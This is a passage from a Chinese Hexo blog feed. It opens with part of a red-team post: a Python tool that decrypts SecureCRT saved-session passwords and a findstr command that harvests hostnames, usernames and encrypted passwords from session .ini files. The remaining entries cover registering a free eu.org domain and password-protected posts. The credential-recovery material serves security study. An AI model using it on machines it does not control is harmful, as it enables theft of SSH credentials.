class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Initialize SecureCRTCryptoV2 object.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            ConfigPassphrase: The config passphrase that SecureCRT uses. Leave it empty if config passphrase is not set.</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="variable language_">self</span>.IV = <span class="string">b&#x27;\x00&#x27;</span> * AES.block_size</span><br><span class="line">        <span class="variable language_">self</span>.Key = SHA256.new(ConfigPassphrase.encode(<span class="string">&#x27;utf-8&#x27;</span>)).digest()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Encrypt</span>(<span class="params">self, Plaintext : <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Encrypt plaintext and return corresponding ciphertext.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            Plaintext: A string that will be encrypted.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            Hexlified ciphertext string.</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        plain_bytes = Plaintext.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(plain_bytes) &gt; <span class="number">0xffffffff</span>:</span><br><span class="line">            <span class="keyword">raise</span> OverflowError(<span class="string">&#x27;Plaintext is too long.&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        plain_bytes = \</span><br><span class="line">            <span class="built_in">len</span>(plain_bytes).to_bytes(<span class="number">4</span>, <span class="string">&#x27;little&#x27;</span>) + \</span><br><span class="line">            plain_bytes + \</span><br><span class="line">            SHA256.new(plain_bytes).digest()</span><br><span class="line">        padded_plain_bytes = \</span><br><span class="line">            plain_bytes + \</span><br><span class="line">            os.urandom(AES.block_size - <span class="built_in">len</span>(plain_bytes) % AES.block_size)</span><br><span class="line">        cipher = AES.new(<span class="variable language_">self</span>.Key, AES.MODE_CBC, iv = <span class="variable language_">self</span>.IV)</span><br><span class="line">        <span class="keyword">return</span> cipher.encrypt(padded_plain_bytes).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Decrypt</span>(<span class="params">self, Ciphertext : <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Decrypt ciphertext and return corresponding plaintext.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            Ciphertext: A hex string that will be decrypted.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            Plaintext string.</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        cipher = AES.new(<span class="variable language_">self</span>.Key, AES.MODE_CBC, iv = <span class="variable language_">self</span>.IV)</span><br><span class="line">        padded_plain_bytes = cipher.decrypt(<span class="built_in">bytes</span>.fromhex(Ciphertext))</span><br><span class="line">        </span><br><span class="line">        plain_bytes_length = <span class="built_in">int</span>.from_bytes(padded_plain_bytes[<span class="number">0</span>:<span class="number">4</span>], <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        plain_bytes = padded_plain_bytes[<span class="number">4</span>:<span class="number">4</span> + plain_bytes_length]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(plain_bytes) != plain_bytes_length:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Invalid Ciphertext.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        plain_bytes_digest = padded_plain_bytes[<span class="number">4</span> + plain_bytes_length:<span class="number">4</span> + plain_bytes_length + SHA256.digest_size]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(plain_bytes_digest) != SHA256.digest_size:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Invalid Ciphertext.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> SHA256.new(plain_bytes).digest() != plain_bytes_digest:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Invalid Ciphertext.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> plain_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Help</span>():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Usage:&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;    SecureCRTCipher.py &lt;enc|dec&gt; [-v2] [-p ConfigPassphrase] &lt;plaintext|ciphertext&gt;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;    &lt;enc|dec&gt;              &quot;enc&quot; for encryption, &quot;dec&quot; for decryption.&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;                           This parameter must be specified.&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;    [-v2]                  Encrypt/Decrypt with &quot;Password V2&quot; algorithm.&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;                           This parameter is optional.&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;    [-p ConfigPassphrase]  The config passphrase that SecureCRT uses.&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;                           This parameter is optional.&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;    &lt;plaintext|ciphertext&gt; Plaintext string or ciphertext string.&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;                           NOTICE: Ciphertext string must be a hex string.&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;                           This parameter must be specified.&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">EncryptionRoutine</span>(<span class="params">UseV2 : <span class="built_in">bool</span>, ConfigPassphrase : <span class="built_in">str</span>, Plaintext : <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> UseV2:</span><br><span class="line">                <span class="built_in">print</span>(SecureCRTCryptoV2(ConfigPassphrase).Encrypt(Plaintext))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(SecureCRTCrypto().Encrypt(Plaintext))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Error: Failed to encrypt.&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">DecryptionRoutine</span>(<span class="params">UseV2 : <span class="built_in">bool</span>, ConfigPassphrase : <span class="built_in">str</span>, Ciphertext : <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> UseV2:</span><br><span class="line">                <span class="built_in">print</span>(SecureCRTCryptoV2(ConfigPassphrase).Decrypt(Ciphertext))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(SecureCRTCrypto().Decrypt(Ciphertext))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Error: Failed to decrypt.&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Main</span>(<span class="params">argc : <span class="built_in">int</span>, argv : <span class="built_in">list</span></span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="number">3</span> &lt;= argc <span class="keyword">and</span> argc &lt;= <span class="number">6</span>:</span><br><span class="line">            bUseV2 = <span class="literal">False</span></span><br><span class="line">            ConfigPassphrase = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> argv[<span class="number">1</span>].lower() == <span class="string">&#x27;enc&#x27;</span>:</span><br><span class="line">                bEncrypt = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">elif</span> argv[<span class="number">1</span>].lower() == <span class="string">&#x27;dec&#x27;</span>:</span><br><span class="line">                bEncrypt = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                Help()</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">            </span><br><span class="line">            i = <span class="number">2</span></span><br><span class="line">            <span class="keyword">while</span> i &lt; argc - <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span> argv[i].lower() == <span class="string">&#x27;-v2&#x27;</span>:</span><br><span class="line">                    bUseV2 = <span class="literal">True</span></span><br><span class="line">                    i += <span class="number">1</span></span><br><span class="line">                <span class="keyword">elif</span> argv[i].lower() == <span class="string">&#x27;-p&#x27;</span> <span class="keyword">and</span> i + <span class="number">1</span> &lt; argc - <span class="number">1</span>:</span><br><span class="line">                    ConfigPassphrase = argv[i + <span class="number">1</span>]</span><br><span class="line">                    i += <span class="number">2</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    Help()</span><br><span class="line">                    <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> bUseV2 == <span class="literal">False</span> <span class="keyword">and</span> <span class="built_in">len</span>(ConfigPassphrase) != <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;Error: ConfigPassphrase is not supported if &quot;-v2&quot; is not specified&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> bEncrypt:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span> <span class="keyword">if</span> EncryptionRoutine(bUseV2, ConfigPassphrase, argv[-<span class="number">1</span>]) <span class="keyword">else</span> -<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span> <span class="keyword">if</span> DecryptionRoutine(bUseV2, ConfigPassphrase, argv[-<span class="number">1</span>]) <span class="keyword">else</span> -<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            Help()</span><br><span class="line"></span><br><span class="line">    exit(Main(<span class="built_in">len</span>(sys.argv), sys.argv))</span><br></pre></td></tr></table></figure><h4 id="8-X版本"><a href="#8-X版本" class="headerlink" title="8.X版本"></a>8.X版本</h4><p>进入目录提取文件中的连接IP、端口、账号、hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">findstr /si /c:&quot;Hostname&quot; /c:&quot;\&quot;Username\&quot;=&quot; /c:&quot;\&quot;Password V2\&quot;=&quot; /c:&quot;\&quot;[SSH2] Port\&quot;=&quot; *.ini</span><br></pre></td></tr></table></figure><p><img src= "" data-lazy-src="https://w0xking.github.io/picx-images-hosting/win_pass/41822.3rb0q5sxwr.jpg" alt="Alt pic"><br>然后使用上面脚本解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注意去除hash的前面三位 &quot;02:&quot;</span></span><br><span class="line">python3  SecureCRT.py dec -v2 <span class="built_in">hash</span></span><br></pre></td></tr></table></figure><p><img src= "" data-lazy-src="https://w0xking.github.io/picx-images-hosting/win_pass/41823.1setztnfl8.jpg" alt="Alt pic"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红蓝对抗 </tag>
            
            <tag> 密码 </tag>
            
            <tag> 推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>freedomain博客加速</title>
      <link href="/posts/e9f0bb2c.html"/>
      <url>/posts/e9f0bb2c.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言简述"><a href="#0x00-前言简述" class="headerlink" title="0x00 前言简述"></a><a href="https://blog.weiyigeek.top/2022/10-9-688.html#0x00-%E5%89%8D%E8%A8%80%E7%AE%80%E8%BF%B0" title="0x00 前言简述"></a>0x00 前言简述</h2><p>描述：在逛B站的时候发现可以免费注册申请永久的eu.org顶级网域，一想到自己现在域名【weiyigeek.top】后续续费要上百人民币, 所以我随手就马上去注册了一个（白嫖谁不爱），下面将快速申请注册 eu.org 域名注意事项进行说明，帮助需要申请免费 eu.org 域名的朋友。</p><p>EU.org 是一个从1996开始提供免费域名的组织, 其官网地址是 <a href="https://nic.eu.org/">https://nic.eu.org/</a> ，他帮助学生、爱好者或者非营利组织不用花费购买域名就可能拥有自己的免费域名，虽然 <a href="https://nic.eu.org/">eu.org</a> 网域切确来说这是一个子域名（Subdomain）或者二级域名，但是根据一些网站的资讯，有许多大型互联网公司，像是 Google, Cloudflare, Bing 等厂商都已经将eu.org域名当成是一个顶级网域了。</p><p>值得注意的是，我们虽然可以进行免费申请，但不要滥用申请，作为申请者应该必须遵守互联网标准(Rfc)，不要利用其来发送垃圾邮件或网络钓鱼以及分发恶意软件，毕竟提供免费的域名的组织，谁也不想其取消免费服务，其次不要多次注册申请占用域名，尽量只是注册需要的域名，通常来说注册两个域名基本就满足日常使用，一个正式站点域名和一个测试站点域名。</p><p>EU.org 开域和政策参考地址：<a href="https://nic.eu.org/opendomains.html">https://nic.eu.org/opendomains.html</a></p><hr><h2 id="0x01-注册申请"><a href="#0x01-注册申请" class="headerlink" title="0x01 注册申请"></a><a href="https://blog.weiyigeek.top/2022/10-9-688.html#0x01-%E6%B3%A8%E5%86%8C%E7%94%B3%E8%AF%B7" title="0x01 注册申请"></a>0x01 注册申请</h2><p>在注册一个eu.org免费域名前，你需要先准备<code>好一个邮箱地址和注册一个Hostry账号</code>才能保证在注册的过程中不会遇到任何的阻碍。</p><ul><li>邮箱地址: google Gmail 、foxmail、QQ 都是可以的邮箱注册（此处相信大家都有邮箱）</li><li>注册Hostry账号以获取免费DNS解析服务（在申请时不建议采用 dnspod ）</li></ul><h3 id="如何注册Hostry获取免费DNS解析服务"><a href="#如何注册Hostry获取免费DNS解析服务" class="headerlink" title="如何注册Hostry获取免费DNS解析服务?"></a><a href="https://blog.weiyigeek.top/2022/10-9-688.html#%E5%A6%82%E4%BD%95%E6%B3%A8%E5%86%8CHostry%E8%8E%B7%E5%8F%96%E5%85%8D%E8%B4%B9DNS%E8%A7%A3%E6%9E%90%E6%9C%8D%E5%8A%A1" title="如何注册Hostry获取免费DNS解析服务?"></a>如何注册Hostry获取免费DNS解析服务?</h3><p>描述：HOSTRY 作为一家可靠且成熟的托管服务提供商，HOSTRY为在线企业提供了大量不同的托管选项，专注于内容交付网络（CDN）、虚拟专用服务器（VPS）、专用服务器和其他解决方案，以确保为客户提供高质量的web托管服务。<br>此处我们主要使用 HOSTRY 其 DNS 解析服务来加快域名申请所占用审核的时间，没有选择 dnspod 是因为有可能在申请免费域名验证解析时会产生错误从而增加审核时间，其次是使用 dnspod 需要进行实名认证，所以推荐使用 HOSTRY 在域名审批通过后再使用 dnspod 来进行解析。</p><ol><li>访问 hostry 官网进行注册用户, 注册地址: <a href="https://hostry.com/register/">https://hostry.com/register/</a>, 输入注册邮箱以及相关的注册信息（反正只用一次信息不一定填真的），然后你再邮箱中会收到一条激活信息进行（<code>ACTIVATE ACCOUNT</code>）即可。</li></ol><p><img src= "" data-lazy-src="https://img.weiyigeek.top/2022/5/20221009114727.png" alt="weiyigeek.top-注册hostry"></p><p>weiyigeek.top-注册hostry</p><p>温馨提示：注册地址邮编自行Google、百度即可。</p><ol start="2"><li><p>注册完毕后即可进行创建免费的DNS解析，创建地址：<a href="https://hostry.com/products/dns/%EF%BC%8C%E5%85%B6%E6%97%A0%E4%B8%BB%E6%9C%BADNS%E4%BD%BF%E6%82%A8%E7%9A%84DNS%E6%9B%B4%E5%BF%AB%E3%80%81%E6%9B%B4%E5%AE%89%E5%85%A8%EF%BC%8C%E5%B9%B6%E4%B8%94%E5%AF%B9%E6%9D%A1%E7%9B%AE%E6%88%96%E8%AF%B7%E6%B1%82%E7%9A%84%E6%95%B0%E9%87%8F%E6%B2%A1%E6%9C%89%E9%99%90%E5%88%B6%E3%80%82">https://hostry.com/products/dns/，其无主机DNS使您的DNS更快、更安全，并且对条目或请求的数量没有限制。</a></p><blockquote><p>例如，输入要注册的域名 <code>wygk.eu.org &gt; CREATE</code> 进行创建即可。</p></blockquote></li></ol><p><img src= "" data-lazy-src="https://img.weiyigeek.top/2022/5/20221009124252.png" alt="weiyigeek.top-创建需要申请的域名解析"></p><p>weiyigeek.top-创建需要申请的域名解析</p><p>温馨提示：此处需要验证一下eu.org要注册的域名是否被注册过了，如果出现如下图片中的情况表示已注册 (此处这是我已经申请下的免费域名)，验证地址：<a href="https://tool.dnspod.cn/">https://tool.dnspod.cn/</a></p><p><img src= "" data-lazy-src="https://img.weiyigeek.top/2022/5/20221009115711.png" alt="weiyigeek.top-dnspod验证eu.org域名是否被注册"></p><p>weiyigeek.top-dnspod验证eu.org域名是否被注册</p><p>至此，注册完毕!</p><h3 id="如何注册eu-org域名"><a href="#如何注册eu-org域名" class="headerlink" title="如何注册eu.org域名?"></a><a href="https://blog.weiyigeek.top/2022/10-9-688.html#%E5%A6%82%E4%BD%95%E6%B3%A8%E5%86%8Ceu-org%E5%9F%9F%E5%90%8D" title="如何注册eu.org域名?"></a>如何注册eu.org域名?</h3><ol><li>在 Google Chrome 或其他浏览器 输入eu.org 然后登入 <a href="https://nic.eu.org/%EF%BC%8C%E7%82%B9%E5%87%BB">https://nic.eu.org/，点击</a> Register 进行创建用户，输入如下账户邮箱、姓名、地址等相关信息,然后将会在邮箱里收到一封验证账户的短信。</li></ol><p><img src= "" data-lazy-src="https://img.weiyigeek.top/2022/5/20221009125606.png" alt="weiyigeek.top-注册验证 eu.org class="></p><p>weiyigeek.top-注册验证 eu.org 账户</p><p>温馨提示：输入Name时姓名首字母要大写，并且中间有空格，里面的地址随意在百度中找寻一个英文地址即可。</p><ol start="2"><li>注册成功登录后，点击 new Domain 创建上述自定义的域名，此处还是以<code>wygk.eu.org</code>申请的域名为例，填写如下信息以及NameServers信息，填写完毕后点击submit进行提交。</li></ol><p><img src= "" data-lazy-src="https://img.weiyigeek.top/2022/5/20221009131006.png" alt="weiyigeek.top-创建自定义eu.org二级域名"></p><p>weiyigeek.top-创建自定义eu.org二级域名</p><ol start="3"><li>提交后将进行域名 <code>server names + replies on SOA + replies on NS</code> 认证记录，如出现下图所示则表示申请提交验证域名NS记录成功审核审核下发，我在两天后便收到了成功的邮件信息。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
            <tag> 热门 </tag>
            
            <tag> 域名 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>github action</title>
      <link href="/posts/548d9c19.html"/>
      <url>/posts/548d9c19.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看加密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="5d9dd0a77176fda33b8fdc35c069e458e2ca04286c5d3e039dcc30f4cf6e7433"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> 博客 </tag>
            
            <tag> github action </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>向你的Hexo里放上一只live2d桌宠!</title>
      <link href="/posts/dc8d366.html"/>
      <url>/posts/dc8d366.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="1e8e4c45b5d9ec2bfd12424a99aa823ab3f3d502262cdbc4dd005f29a4acfe84"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
            <tag> 热门 </tag>
            
            <tag> live2d </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo-blog-encrypt</title>
      <link href="/posts/cb557a52.html"/>
      <url>/posts/cb557a52.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看加密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="7e43aab22a5599bff6f376bb03e95558a00133d0cfbf505d3cacbd0bf8ab781f">c910a667b8645307fd5316064815c433c6ba0f40c9725f332f2b69a19992ef8e76f3d0490fed99f2d93abe5aa3152c67235ad393c016340be3e9913de3c6e6c1f35af57bc764d6d4eade746e164b1e0a2cc41a5d999158e54221f528d6d9b3fb925d64a447ec985bf3e1f053bcd05d32e35801c1e3b3c43989e751110ba1e0ea1bc66d1c39c4a8ff85e3e815b1255955c279936605e66958ce814e267ff951ed42202742ceb9716021ba04f4cd83e514e582e2e9ac42c4bbcb7f1bfd640e0b9a218e3eea9f512aa1057df134b9081c6cca64023f0b531ea4e298f34ade3daa34e345599c17b86c854b2c4ab3e5ceb25fb78127701ca8519eb2c5f1d50fead58e9079385c5d240912d5d9d2f376af0ec2e2f3c2be01377ea8eb2138ff34a40d5e0395faa7ec1b244c61996e75e1d426d62059175ce7b663b1e81fa43b68139232175880abc197c040ffa4f6c9787ad94338fa63ff896f27af3d055573b44b023dff6471ad50fcbfbda9d944c958a9e369b7640f80d059f0fbeb8c54d754612a66e2bfc875d6c5f0155a50a68f43d16cb9d5847bee14034434ed25541287b7389332f4be09bb11b5d6a8d3492e7aedad3ef2eb47e81148321f5d566f071a9492c9d6932c65e49831d488b03b33be83d286ee36ccde1cf7f9f0570f57e62fca4450c91eaf24a0693ab31666379956b764b40cc0bb7353338a973b2c1e0e360b40b4b57050008cac14a385acd52e01548476eee406938b4c9589c1e8b8c3b8f557f213170a32553985b656cfaf3d29499d0f74c2abcd23fe40ed2b8d3d047c8d28380aaf30587467341314798ce8e53e33c61e5a5e38460cde7ff1eeb358eb93ff120e463801b599245e0a1cacf0a3ff16de0c524ae1fb2e23bbaab122002da7edeaddae6b2f5c68edb80b279e2d587d1c9d24d4c441a439f42841394b65fa03f190c04aef61ca8b487e2315833820e8f5f34dcca299c4149f3d07b41314f37e1176640473299977250c59f987a382cd391208943cded97c82d866aa416a726651cf95aee7b56ad8ea129e9448a272589bfccf608c911e98cd8a21dbf11c629ecac99383073d29ec9aca6da1097e24b56934019a8c2aedb3480b50d021ebc54d0c6219a816c5d569d976f028d7592e549d6fa2cecb44fe401e02108578300bd6a5b11489f3fc1589eeb11dfdaf997dd870aacde41a4a9917b26113adac985f0178ef7c212187bc3bb559d9bdafa2b30897bd382cb48f3e0a8eeebe78e166298fd21051367b181b38fbdb24deaabb759664a98bfb98bad98e98728d864534b81bf9b6c1ebb38af7ed790c994515295e2bf5d5d4a4eeb951742e0c120ce137022f43adfd5be318648e6d59af41f6186d9a52daa5ee950b4561c5bb95499f037dd5debc381cc144b5833a28de15acb2e58ae330ff5bfa8af0e2e87b03254ea001dc5fd5f1a72033f940c7f9ec4fd371ebfa533cf047491b2e95be845d58d6728bea4cb81535ce1c0da85355a8bcb180a1c60c7151a5b1ae04e146a135ddb4dc5064e6baf5578e0c8161bd0297956c5b42a639448c8190bd5447d8598dc0e94f4ba039da3cc6a71dd448c10b2cf3a9a07c534b545c711fd99d150fae71e0cccf2f9974accec9343cf599837125d74e133d0c844c1d13f9a083771ad1f142b97214f440b214788dcd4e9c1ea81da65c03986e692dd6b3244bf88079daf9fa2da66fb163b5eb071d842e7e40cbaf0f370fabc99130ec49e4e39de73b7c0ab1bd64a10d8fa881debd4858f65ab2f8cd21984b49934651643b7981291d30884e3e809b51af071dbba016d7eebe4e6d88af49b2d6b04bbbba0e65d9c73fdaccd10c8e39949a9628f76878e0464e5e50620795829f9cd6eda06bd7301af6323185651f890e285bfbf5663ebd4aa67b7f5fb39eecb41ea9a614228ff2ebcbd36726e909e54dad0c89d5a5bf0c688ece11363ea9875d41a603fc701109ff6901890e0c7688d138d5538e0456f5780fab00e332bccb5c108109db9d6ace6749d38ee894afdd894436311a294859637562af992e73370a44f4b56f32d6b83017e6723e827ec778f44710577521d808e11f06d1a24cb4aff4044fd0195e12dd3260f785088e979138c0073b759e883560213cd9bbc0d976b93f814d5520e3046dd9a3f728099c51330751f48d5e664d8c9f60be8c3a3611cc372829a6e314195d1ddd68d3a8118c62b4a0084163c9bc8f096bb3d63a61d2526923f32803c5444803c5e3ee0d39e8a1edb3e2c2d8eb3b9996a8e159098cfbcb005010120952e6a4c459405040a4d7f3aab82c53ac7dde808af6c4c1ab6a67367ffbdc201eb1d2442a4049b361bf7fca22afa44dccaee639f32b23d45fb725c0309254091cdde40e58b2ec686f5029a5f53d7357f416d790b9bfcf82af26c0c050c61c4bd7c731e2e4d177167f762a7813a3424ddec2e8b1377b61d5ee6bd9418d1b18432cb8d9dd2629a3fe895304e67158dc35e14e4d54e3cd5e184ab2f4b92e5e395c241f963833f8105026ef9628b1a16e8cf415a8e3e6e425e6c67475bc4f8422f9525758eca1897657f046309bbfa12e3e806a74acd39d98535c49596f5574ce5176203907f3d720d740cab64edfcc3f4179ad384976c39e48e4030f9d98fa25a121220ba2b3c16d9818af869f103d2649f2282d2fccc192dc22423f1dd63794ac846dc6ed86f16ee1354fdf0219c9e4b0b210f73e5e28329bdd2003c5cecb0f4ffa770e5cea26e853cb3351d147b1785aa259b72d45f672bc078f8de5d6e0a356c73e9e996160014e7eaf9f4b42d279e9b0273ed1702775f0f3f9c91126d6f4176d37e7b7dbf15c37dc0eeeeda16a8239f5ee4ca2c2979852ba3ed5eb55c73cd4fa3f9decbfae320c0ddc033019fe8d1712e71190c5ed7adc100b2a6c3a9505411c2e66d16ca298f6a4445fc8613f6b51ebd27f849af34095b54830992cb3e5f9a1f7629c44b44cd2d8bccfd20b4a6618cb3a30fd7df7995436edd2bcb8bbd3f7d8b9d427579430b693371b85141aa903d20fbb7074e72891c205fef26d3620622422991cb2409b36fd780ac368e79cf49e4ca87e1c00b7751264a7bc75984a5c2e823421ea7297c1e81b540830403276df7fa3401acbd242899af4d8e73b83d92b81ad8e3f552f612134b89a93c387c0a8b3ce11ebae9218077b94ba8a443fe4913cd4dcd9dccd208a